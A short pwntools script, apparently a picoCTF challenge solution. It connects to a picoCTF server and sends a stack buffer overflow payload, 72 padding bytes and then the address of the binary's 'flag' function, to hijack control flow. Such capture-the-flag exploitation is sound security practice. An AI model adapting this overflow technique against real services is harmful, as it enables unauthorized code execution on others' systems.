from pwn import *

elf = ELF("./vuln")

r = remote("saturn.picoctf.net", 55840)

payload = b"A" * 72 + p64(elf.symbols['flag']+5)

log.info(r.recvS())
r.sendline(payload)
log.success(r.recvallS())
